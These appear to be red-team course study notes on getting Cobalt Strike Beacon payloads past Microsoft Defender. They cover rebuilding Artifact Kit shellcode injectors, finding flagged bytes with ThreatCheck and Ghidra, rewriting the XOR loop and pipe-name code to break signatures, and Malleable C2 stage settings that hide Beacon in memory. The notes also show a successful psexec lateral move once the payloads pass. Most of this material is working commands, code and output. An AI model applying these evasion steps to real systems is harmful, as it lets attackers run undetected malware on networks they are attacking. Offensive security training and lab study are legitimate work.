---
description: 10/04/2025
---

# Microsoft Defender Antivirus

## Introduction

Microsoft Defender is an antivirus product that comes pre-installed with Windows (both desktop and server editions).

In previous years, Defender was seen as a bit of a joke, but has since evolved into a rather formidable defence.

**There are three facets to its detection capability that we shall explore in this chapter:**

1. **On-disk**
2. **In-memory**
3. **Behavioral**

### How Payloads are Generated in Cobalt Strike

Before diving into Defender, it's useful to explain how payloads are generated in Cobalt Strike since there are only a few individual parts.

Beacon itself is written as a _**Reflective DLL**_ based on _**Steven Fewer's**_ [work](https://github.com/stephenfewer/ReflectiveDLLInjection).

**So, there's the:**

1. Core Beacon DLL (everything that make Beacon actually function)&#x20;
2. Plus a reflective loader component.

These are then converted into Position Independent Shellcode, which when injected and executed, calls the reflective loader entry point.

The reflective loader then loads the Beacon DLL into memory and kicks off a new thread to run it.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Settings from **Malleable C2 profile**, such as the callback addresses are stomped into the DLL at the time your payloads are generated.

When you generate payloads artifacts such as the EXE's, DLL's, and PowerShell, this Beacon shellcode is generated, XOR'd and then stomped into them.

The artifacts themselves act as "simple" shellcode injectors.&#x20;

They all, with the exception of the service binary, inject Beacon shellcode into themselves.&#x20;

**That flow looks something like this:**

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

The service binary is identical except that it spawns another process and performs remote injection instead.

The complication when trying to bypass AV signatures is knowing which "part" of the payload they apply to - the core Beacon, the reflective loader, or the artifact.

## Artifact Kit

As we've all learned by now, dropping files to disk has a pretty bad rap.&#x20;

There are instances where it is pretty much unavoidable if we want to deploy certain tactics against our target(s).

For instance, we have access to the File Server, but we can't <mark style="color:yellow;">`PsExec`</mark> to it because the default binary payload is protect by Defender.

**Here's what happens if we try with Defender enabled:**

```
beacon> ls \\fs.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/14/2022 15:44:51   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/14/2022 15:55:16   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/14/2022 15:59:23   ProgramData
          dir     09/14/2022 15:25:23   Recovery
          dir     09/14/2022 15:25:04   System Volume Information
          dir     09/14/2022 15:26:47   Users
          dir     09/14/2022 15:25:15   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/14/2022 16:00:25   DumpStack.log.tmp
 1gb      fil     09/14/2022 16:00:25   pagefile.sys

beacon> jump psexec64 fs.dev.cyberbotic.io smb
[-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225
```

**We can view that message (`225`) by using:**

```
PS C:\Users\Attacker> net helpmsg 225

Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

and verify that Windows Defender indeed blocked the attempt.

**If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected:**

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

These Cobalt Strike "artifacts" are nothing more than shellcode runners that inject Beacon shellcode when executed.&#x20;

As a _**rule of thumb**_, they inject the shellcode into themselves (e.g. using the `VirtualAlloc()` & `CreateThread()` pattern).

The service binary is the one exception, as it spawns a new process and injects the shellcode into that instead.

This is done so that when moving laterally with <mark style="color:yellow;">`PsExec`</mark>, the artifact can be deleted from disk immediately.

The Artifact Kit contains the source code for these artifacts and is designed to facilitate the development the development of sandbox-safe injectors. The idea is to develop artifacts that inject Beacon shellcode in a way that cannot be emulated by AV engines.

There are several bypass techniques provided with the kit which you can modify, or you can implement entirely new ones yourself.

Where the Artifact Kit does not help is making Beacon resilient to detection once it's running in memory (e.g. from memory scanners).

### Locating the kit and What it Consists of

The kit can be found in <mark style="color:yellow;">`C:\Tools\cobaltstrike\arsenal-kit\kits\artifact`</mark>.

Code for the entry point of each artifact format (i.e. EXE and DLL) can be found in `src-main`.

These include `dllmain.c` for artifacts, `main.c` for the EXE artifacts, and `svcmain.c` for the service EXE artifacts.

{% hint style="success" %}
These simply call a function called `start`, so you usually do not need to modify these files in most cases.

The implementation of this function can be found in each bypass file.
{% endhint %}

**These bypass files can be found in&#x20;**<mark style="color:yellow;">**`src-common`**</mark>**&#x20;and are named&#x20;**<mark style="color:yellow;">**`bypass-<technique>.c`**</mark>**.**

**The included ones are:**

* `mailslot` - reads the shellcode over a mailslot.
* `peek` - uses a combination of `Sleep`, `PeekMessage`, and `GetTickCount`.
* `pipe` - reads the shellcode over a named pipe.
* `readfile` - artifact reads itself from disk and seeks to find the embedded shellcode

### Modifying and Building Artifact Kits

Before we make any modifications to the kit, let's build one of the variants "as is".

The kit will include a build script which uses <mark style="color:yellow;">`mingw`</mark> to compile the artifacts.

**Running it without arguments will show the usage:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact
```

There is a `README.md` file inside the Artifact Kit directory for more information.

**Let's build a new set of artifact templates using the&#x20;**_<mark style="color:yellow;">**bypass-pipe**</mark>_**&#x20;technique:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```

**Each artifact flavour will be compiled to:** <mark style="color:yellow;">`/mnt/c/Tools/cobaltstrike/artifacts/pipe/`</mark> in my case, along with an aggressor script, `artifact.cna`:

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ls -l /mnt/c/Tools/cobaltstrike/artifacts/pipe/
total 2044
-rwxrwxrwx 1 ubuntu ubuntu  11914 Nov  6 14:56 artifact.cna*
-rwxrwxrwx 1 ubuntu ubuntu  14336 Nov  6 14:55 artifact32.dll*
-rwxrwxrwx 1 ubuntu ubuntu  14848 Nov  6 14:55 artifact32.exe*
-rwxrwxrwx 1 ubuntu ubuntu 323584 Nov  6 14:55 artifact32big.dll*
-rwxrwxrwx 1 ubuntu ubuntu 324096 Nov  6 14:55 artifact32big.exe*
-rwxrwxrwx 1 ubuntu ubuntu  15360 Nov  6 14:55 artifact32svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 324608 Nov  6 14:55 artifact32svcbig.exe*
-rwxrwxrwx 1 ubuntu ubuntu  19456 Nov  6 14:56 artifact64.exe*
-rwxrwxrwx 1 ubuntu ubuntu  18432 Nov  6 14:55 artifact64.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu 328704 Nov  6 14:56 artifact64big.exe*
-rwxrwxrwx 1 ubuntu ubuntu 327680 Nov  6 14:56 artifact64big.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu  20480 Nov  6 14:56 artifact64svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 329728 Nov  6 14:56 artifact64svcbig.exe*
```

**The naming convention of these files tell you what they are used for:**

* '<mark style="color:yellow;">32/64</mark>' denotes _**32 and 64bit architectures**_.
* '<mark style="color:yellow;">big</mark>' denotes that it's _<mark style="color:yellow;">**stageless**</mark>_.
* '<mark style="color:yellow;">svc</mark>' denotes that it's a service _<mark style="color:yellow;">**executable**</mark>_.

Before loading these into Cobalt Strike, it is useful to analyze them into a tool like [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). &#x20;

This will split the file into little chunks and scan them with Defender to reveal any parts that trip static signatures. &#x20;

{% hint style="info" %}
**Note that ThreatCheck cannot emulate the AV sandbox, so this is for static signatures only.**
{% endhint %}

#### Using `ThreatCheck.exe`

```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 329728 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xBEC
00000000   B9 06 00 00 00 4C 89 E7  4C 8D 05 05 E9 04 00 F3   1····L?çL?··é··ó
00000010   AB 4C 89 E9 C7 84 24 88  00 00 00 68 00 00 00 FF   «L?éÇ?$?···h···ÿ
00000020   15 57 2D 05 00 45 31 C9  45 31 C0 31 C9 4C 89 64   ·W-··E1ÉE1A1ÉL?d
00000030   24 48 4C 89 EA 48 89 6C  24 40 48 C7 44 24 38 00   $HL?êH?l$@HÇD$8·
00000040   00 00 00 48 C7 44 24 30  00 00 00 00 C7 44 24 28   ···HÇD$0····ÇD$(
00000050   04 00 00 00 C7 44 24 20  01 00 00 00 FF 15 8A 2B   ····ÇD$ ····ÿ·?+
00000060   05 00 85 C0 74 32 48 8B  4C 24 70 48 85 C9 74 28   ··?At2H?L$pH?Ét(
00000070   0F 10 44 24 70 48 8D 54  24 50 4C 63 CE 49 89 D8   ··D$pH?T$PLcII?O
00000080   48 8B 84 24 80 00 00 00  0F 11 44 24 50 48 89 44   H??$?·····D$PH?D
00000090   24 60 E8 6E FE FF FF 90  48 81 C4 F8 04 00 00 5B   $`èn_ÿÿ?H?Äo···[
000000A0   5E 5F 5D 41 5C 41 5D C3  57 56 48 83 EC 68 48 8D   ^_]A\A]AWVH?ìhH?
000000B0   35 62 E8 04 00 31 C0 49  89 C9 48 8D 7C 24 20 B9   5bè··1AI?ÉH?|$ 1
000000C0   10 00 00 00 41 89 D2 F3  A5 4C 89 C2 4C 8D 44 24   ····A?Oó¥L?AL?D$
000000D0   20 48 89 C1 83 E1 07 8A  0C 0A 41 30 0C 00 48 FF    H?A?á·?··A0··Hÿ
000000E0   C0 48 83 F8 40 75 EA 31  C0 41 39 C2 7E 12 48 89   AH?o@uê1AA9A~·H?
000000F0   C1 83 E1 07 8A 0C 0A 41  30 0C 01 48 FF C0 EB E9   A?á·?··A0··HÿAëé
```

{% hint style="info" %}
Ensure real-time protection is <mark style="color:$danger;">**disabled**</mark> in Defender before running ThreatCheck against binary artifacts.
{% endhint %}

#### Going through output...

We can see that the stageless service binary artifact has something that Defender doesn't like.

However, there's not much context around what this is or where it is in the binary.

Reversing tools such as as [IDA](https://hex-rays.com/) and [Ghidra](https://github.com/NationalSecurityAgency/ghidra) can help here because it allows us to dissect the file.

Launch **Ghidra** by running the start script at <mark style="color:yellow;">`C:\Tools\ghira-10.3.1\ghidraRun.bat`</mark>.

Create a new non-shared project from _**File** > **New Project**,_ then import your artifact by going to _**File** > **Import File**_.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Double-click on the imported file to open it in the CodeBrowser.

When prompted, select _**Yes**_ to analyze the binary (the default selected analyzers are fine).&#x20;

The next task is to find the portion of code reported by ThreatCheck, for which there are two easy ways.&#x20;

The first is to search for a specific byte sequence output by ThreatCheck, for example: <mark style="color:yellow;">`C1 83 E1 07 8A 0C 0A 41 30 0C 01 48 FF C0 EB E9`</mark>.

Go to _**Search** > **Memory**_, paste the string into the search box and click _Search All_.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Here we have one result.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/6e6/cfe/6e9/ghidra-search-results.png)

Clicking on it will take you to the location in the code browser.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

The other method is to use the "bad bytes offset" as given by ThreatCheck.

_**Select Navigation** > **Go To**_ and enter <mark style="color:yellow;">`file(n)`</mark> where <mark style="color:yellow;">`n`</mark> is the offset.  In this case it would be <mark style="color:yellow;">`file(0xBEC)`</mark>.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Unfortunately, we do not have debug symbols for the compiled payloads so function and variable names will be quite generic, like like `FUN_xxx` and `lVarx`. &#x20;

However, we can still quite easily see that the portion of highlighted code is a <mark style="color:yellow;">`for`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">loop</mark>.  We can go back to the Artifact Kit source code and search for any such loops.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We can dismiss most of these files because we didn't use the _**readfile**_ bypass nor did we enable syscalls. &#x20;

Therefore, the candidates in <mark style="color:yellow;">`patch.c`</mark> seem the most promising.  Because this is a service binary payload, we know that it will perform a "migration" (i.e. it spawns a new process and injects Beacon shellcode into it before exiting). &#x20;

This <mark style="color:yellow;">`spawn`</mark> function under an <mark style="color:yellow;">`#ifdef _MIGRATE_`</mark> directive is a dead ringer for the decompiled version in Ghidra.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
:bulb:To break the detection, we just have to modify the routine so that it compiles to a different byte sequence.&#x20;
{% endhint %}

**For example:**

```c
for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}
```

Rebuild the kit and scan the new version of the artifact.&#x20;

This time we have a different signature - _**this is an iterative process, so we must repeat these steps until all the detections have been removed**_:

```
[!] Identified end of bad bytes at offset 0xE44
00000000   89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89   ?Ä1AI?üÿt>?U~·I?
00000010   F9 41 89 D8 48 89 F2 4C  89 E1 48 C7 44 24 20 00   ùA?OH?òL?áHÇD$ ·
00000020   00 00 00 FF 15 FB 29 05  00 85 C0 75 10 4C 89 E1   ···ÿ·û)··?Au·L?á
00000030   FF 15 3E 29 05 00 B8 01  00 00 00 EB 0B 8B 54 24   ÿ·>)··,····ë·?T$
00000040   4C 48 01 D6 29 D3 EB C2  48 83 C4 58 5B 5E 5F 41   LH·Ö)OëAH?ÄX[^_A
00000050   5C C3 41 54 56 53 48 83  EC 20 48 8B 1D 6B EB 04   \AATVSH?ì H?·kë·
00000060   00 48 63 4B 04 E8 22 17  00 00 48 8B 35 F3 29 05   ·HcK·è"···H?5ó)·
00000070   00 49 89 C4 B9 00 04 00  00 FF D6 8B 53 04 4C 89   ·I?Ä1····ÿÖ?S·L?
00000080   E1 E8 2A FF FF FF 85 C0  74 EA 8B 53 04 4C 8D 43   áè*ÿÿÿ?Atê?S·L?C
00000090   08 4C 89 E1 E8 B7 FD FF  FF 4C 89 E1 E8 FB 16 00   ·L?áè·yÿÿL?áèû··
000000A0   00 31 C0 48 83 C4 20 5B  5E 41 5C C3 48 83 EC 68   ·1AH?Ä [^A\AH?ìh
000000B0   FF 15 4E 29 05 00 B9 AA  26 00 00 31 D2 41 B9 5C   ÿ·N)··1ª&··1OA1\
000000C0   00 00 00 F7 F1 C7 44 24  50 5C 00 00 00 C7 44 24   ···÷ñÇD$P\···ÇD$
000000D0   48 65 00 00 00 C7 44 24  40 70 00 00 00 C7 44 24   He···ÇD$@p···ÇD$
000000E0   38 69 00 00 00 C7 44 24  30 70 00 00 00 C7 44 24   8i···ÇD$0p···ÇD$
000000F0   28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C   (\···ÇD$ .···A,\
```

This one seems related to the `sprintf` call used to create the pseudo-random pipe name in <mark style="color:yellow;">bypass-pipe.c</mark>.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**We can get around this one from changing this:**

```c
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

**To something like this:**

```c
sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

_**In most cases,&#x20;**<mark style="color:$success;">**it doesn't really matter what you change things to**</mark>_, _**as long as it's different (and still functional)**_. &#x20;

With that change, we finally have a clean artifact.

```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] No threat found!
[*] Run time: 0.72s
```

{% hint style="info" %}
Note that these specific examples may differ as signatures and the Beacon payload changes over time, but this methodology should always get you through.&#x20;

Each artifact type will also likely have different signatures used to detect them that you'll need to work through.
{% endhint %}

To tell Cobalt Strike to use these new artifacts, we must load the aggressor script. &#x20;

Go to _**Cobalt Strike** > **Script Manager** > Load_ and select the <mark style="color:yellow;">`artifact.cna`</mark> file in your output directory.  Any DLL and EXE payloads that you generate from hereon will use those new artifacts, so use _Payloads > Windows Stageless Generate All Payloads_ to replace all of your payloads in `C:\Payloads`.

{% hint style="info" %}
It's strongly advised to delete the existing payloads first because they sometimes only get partially overwritten with the new ones.
{% endhint %}

We should now be able to move laterally to the file server using `PsExec`.

```
beacon> jump psexec64 fs.dev.cyberbotic.io smb
Started service 96126c2 on fs.dev.cyberbotic.io

[+] established link to child beacon: 10.10.122.15
```

Simply unload the CNA from the Script Manager if you want to revert back to the default payloads.

### Steps to Creating an Artifact Kit to Bypass Defender

1. Identify location on disk where your artifact kit is, it is likely in `C:\Tools\cobaltstrike\artifacts`
   1. Note that this `\artifacts` directory will not be generated until you run the next step
2. Build the artifacts directory using:

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```

* Notice how you can specify different "flavors" such as `pipe` that will specify the various different _**bypasses**_ that we can use.
* For example, the above command generates a series of bypasses using the _**pipe bypass**_ technique
* This will compile that bit of code in your artifacts

3. After building, we will now see the `\artifacts` contains our `pipe` bypass.
   1. Different types of files will be created (naming convention differentiation):&#x20;
      1. `big` : **stageless**
      2. no `big`: **staged**
      3. `svc` : **service binaries**
   2. At this point, the Beacon shellcode is _**NOT**_ in the bypasses yet, but the buffer space for that shellcode has been allocated for that shellcode in the future
4. Open Cobalt Strike and load in the egress-er (this is the `.cna` file found in `C:\tools\cobaltstrike\artifacts\pipe\blah.cna`
5. In Cobalt Strike, go to **Payloads -> Generate all Payloads**
6. The Cobalt Strike client will obtain Beacon shellcode, pull artifacts from disk, and patch the Beacon shellcode into the artifacts in their relevant positions (buffers) and output them in the payloads directory
7. Next step is to test and verify that they will currently be detected by Win Defender, we can do this using `ThreatCheck.exe`.
   1. `C:\Tools\ThreatCheck\bin\Debug\ThreatCheck.exe`
   2. ```
      C:\Tools\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\path\to\artifact\here.exe
      ```

* This will run through the binary and find what part that Win Defender does not like
* Be sure to keep this window open as we will need this offset and these bytes to locate them in Ghidra

8. Now for the bypass
   1. Open Ghidra
   2. Create a new project
   3. Import file
   4. Grab the payload template in `C:\Tools\CobaltStrike\artifacts\pipe\artifactsbig64.exe`
   5. Open that in Ghidra and analyze it using default parameters
9. Once opened in Ghidra, we need to do the following, grab the bytes obtained from `ThreatCheck.exe`, **Search -> Memory -> Paste bytes in -> Search All -> Go to result**
10. Ghidra will jump you to that location in memory
11. You will see a call to `VirtualAlloc`
12. Go back to the Artifact Kit in `patch.c`
13. You will start seeing similar code from source code and in the pseudo code/disassembly in Ghidra
14. The particular bytes that it does not like is likely the loop in addition to the `xor` operation that is implemented
15. **It is likely that Win Defender does not like:**

```c
for (int x = 0; x < length; x++) {
    *((char *)ptr + x) = * ((char *)buffer +x) ^ key[x % 8]; // 8 byte XoR
}
```

* As this is the byte sequence that `ThreatCheck.exe` identified
* We must change this code in a way that will compile to a different byte sequence

16. **We will need to change that to something like:**

```c
for (int x = 0; x < length; x++) {
    
    char* a = (char *)ptr + x;
    char* b = (char *)buffer + x;
 
     // random filler code here -- generates a random integer
     GetTickCount();
     
    *a = *b ^ key[x % 8];
}
```

17. Save the new source code
18. Go back to the kit at step 7 section b and rebuild the kit
19. Run `ThreatCheck.exe` against it once more
20. You will likely find another malicious signature once more
21. Reload the NEW binary into Ghidra and re-import it once more
22. Just like before, search for that byte sequence in memory using the Ghidra Memory search tool
23. This new signature will find something like a `sprintf` hard-coded string&#x20;

**We can get around this one from changing this:**

```c
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

**To something like this:**

```c
sprintf(pipename, "%c%c%c%c%c%c%c%c%cxyco\\nix", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

* Save the changes
* Rebuild the kit once more
* Run against `ThreatCheck.exe`

You shouldn't see any threats found!

24. Go to **Payloads** in Cobalt Strike and generate your payloads
25. You can now test your custom payload Beacons on your Attacker machine to ensure that Win Defender is not catching it
26. Drag the `http_x64.exe` payload in `C:\Payloads` to the `Desktop`, if Win Defender is not alerting you, it did not catch this malicious binary being written to disk
27. Execute the binary and check for the callback to Cobalt Strike to ensure that you have a successful Beacon.

## Malleable C2

Beacons are also susceptible to being caught while it is running in memory.

Some actions, such as lateral movement, can trigger these memory scans.

However, Defender carries out routine scans against running processes.

<mark style="color:yellow;">Therefore, the time between spawning your Beacon and the time to detection can vary greatly.</mark>

You can see the `sms` label in the Defender UI, which will indicate that the alert originated from a memory scan.

<figure><img src="../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

Alternatively, `Get-MpThreatDetection` labels them as `behavior:_process`.

```
ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.23080.2006
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 3
DetectionID                    : {7114476A-30B4-4D1C-A50A-14C024DFBDD3}
DetectionSourceTypeID          : 0
DomainUser                     :
InitialDetectionTime           : 12/10/2023 13:52:38
LastThreatStatusChangeTime     : 12/10/2023 13:52:40
ProcessName                    : C:\Windows\System32\rundll32.exe
RemediationTime                : 12/10/2023 13:52:40
Resources                      : {behavior:_process: C:\Windows\System32\rundll32.exe, pid:3196:59045527721095,
                                 process:_pid:3196,ProcessStart:133415922931504282}
ThreatID                       : 2147798570
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :
```

Scanning the shellcode payload type with `ThreatCheck.exe` can be a good way to help find these signatures because although the service binary artifact itself is "clean":

```
PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.svc.exe
[+] No threat found!
[*] Run time: 0.55s
```

**The raw shellcode is not:**

```
PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.xprocess.bin
[+] Target file size: 295936 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xF61F
00000000   3B DE 7D 34 0F BE 13 48  FF C3 40 0F BE C5 8B CA   ;_}4·_·HÿA@·_Å?E
00000010   C0 FA 04 41 83 C2 02 83  E1 0F 80 E2 0F 03 C8 40   Aú·A?A·?á·?â··E@
00000020   02 D5 43 88 4C 0B 01 49  8D 0C 18 43 88 14 0B 49   ·OC?L··I?··C?··I
00000030   83 C3 02 48 3B CF 7C C7  48 8B 5C 24 08 48 8B 6C   ?A·H;I|ÇH?\$·H?l
00000040   24 10 48 8B 74 24 18 48  8B 7C 24 20 41 8B C2 C3   $·H?t$·H?|$ A?AA
00000050   CC 4C 63 D2 49 63 C1 49  83 EA 04 4C 3B D0 76 03   ILcOIcAI?ê·L;Dv·
00000060   33 C0 C3 4C 8B D9 48 83  C1 04 83 EA 04 74 25 45   3AAL?UH?A·?ê·t%E
00000070   33 C9 44 8B D2 49 2B C8  49 8B C1 49 FF C1 83 E0   3ÉD?OI+EI?AIÿA?à
00000080   03 42 8A 04 18 42 32 04  01 41 88 00 49 FF C0 49   ·B?··B2··A?·IÿAI
00000090   FF CA 75 E4 8B C2 C3 CC  CC 48 8B C4 48 89 58 08   ÿEuä?AAIIH?ÄH?X·
000000A0   48 89 68 10 48 89 70 18  48 89 78 20 41 56 48 83   H?h·H?p·H?x AVH?
000000B0   EC 20 48 63 F2 49 63 C1  49 8B D8 48 83 C6 04 8B   ì HcòIcAI?OH?Æ·?
000000C0   FA 48 8B E9 4D 8B F0 48  3B F0 76 04 33 C0 EB 33   úH?éM?dH;dv·3Aë3
000000D0   E8 E4 ED FF FF 33 D2 89  03 48 83 C3 04 85 FF 74   èäíÿÿ3O?·H?A·?ÿt
000000E0   20 48 2B EB 48 8B C7 48  8B CA 48 FF C2 83 E1 03    H+ëH?ÇH?EHÿA?á·
000000F0   42 8A 0C 31 32 0C 2B 88  0B 48 FF C3 48 FF C8 75   B?·12·+?·HÿAHÿEu
```

{% hint style="info" %}
:bulb: Remember, our shellcode will be in a `.bin` file (e.g. `http_x64.svc.exe`).
{% endhint %}

This indicates that the signature(s) are targeting the reflective loader or the Beacon DLL.

The Beacon source code is closed source, so we have no way to access or modify it directly.

* You could write a completely custom reflective loader via the **UDRL kit,** but that is beyond the scope of this exam.

The easiest way to get around this and make modifications to both of these components is by what is by using what is exposed in Malleable C2.

From the console of the **Attacker Desktop**, right-click on the Terminal icon in the taskbar and select **Team Server**. This will SSH you into the **Attacker Linux VM**.

<figure><img src="../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

After you have connected via SSH, connect into the team server directory at `\opt\cobaltstrike\server` and open the `default.profile` in a text-editor (e.g. `vim` or `nano`).

**Use the following three simple settings and try them out (we may need to do more research here but it's worth a start):**

```
stage {
    set userwx "false";
    set module_x64 "xpsservices.dll";
    set copy_pe_header "false";
}
```

Setting `userwx` to `false` tells the reflective loader to allocate memory for the Beacon DLL as `RW/RX` rather than `RWX`.

Although this does not remove any indications from the Beacon itself, it is much MUCH less suspicious than `RWX`.

<figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Setting `cleanup` to `true` tells Beacon to `free` the memory associated with the reflective loader _**after**_ it has been loaded.

<mark style="color:red;">Once the Beacon is loaded, the reflective loader is no longer required and leaving it in memory just results in indicators sitting there to be spotted.</mark>

This allows the reflective loader to be freed, removing those indicators for the remainder of Beacon's lifetime.&#x20;

<figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

Setting the `copy_pe_header` tells the reflective loader to copy Beacon to a new memory location without its DLL headers.

### Summary

In all cases above, we can see that the _**Use**_ column for Beacon's memory region is blank. This is because the DLL is reflectively loaded from memory, rather than being loaded from disk.

Every other legitimate `RX` region in the process is backed by a DLL on disk, so this makes the Beacon itself stand out.

Setting the `module_x64` (and `module_x86` for 32-bit payloads) tells the reflective loader to load the specified DLL from disk first and then overwrite the memory allocated for it with Beacon.

This has the overall illusion of making it appear as though Beacon's memory region is backed by a legitimate DLL.

### Choosing a DLL

**There are two caveats to consider when choosing a DLL to use:**

1. **The DLL size must be equal to or greater than the Beacon**
2. **The DLL must not be needed by the application hosting the Beacon**
   1. **This isn't a concern when executing artifacts, but does become relevant when injecting Beacon shellcode into existing processes**

<figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

## Resource Kit

### What is the Antimalware Scan Interface (AMSI)

The [Antimalware Scan Interface](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) (AMSI) is a component of Windows which allows applications to integrate themselves with an antivirus engine by providing a consumable, language agnostic interface.&#x20;

